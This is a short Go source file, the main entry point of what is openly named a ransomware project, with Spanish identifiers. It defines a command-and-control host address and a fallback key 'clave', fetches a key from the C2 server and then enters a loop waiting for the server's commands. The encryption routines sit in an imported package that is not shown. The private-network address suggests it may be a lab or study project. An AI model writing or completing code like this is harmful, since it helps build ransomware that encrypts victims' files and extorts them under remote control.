package main

import (
	"fmt"
	"ransomware/ransomUtils"
)

const (
	c2Host     = "192.168.1.43:9090"
	defaultKey = "clave"
)

func main() {
	key, con, re, err := ransomUtils.ConectarClave(c2Host)
	if err != nil {
		fmt.Println("Error al conectar con el C2:", err)
		key = defaultKey
	}

	if con != nil {
		ransomUtils.EsperarComandos(con, re, c2Host, key)
	}
}
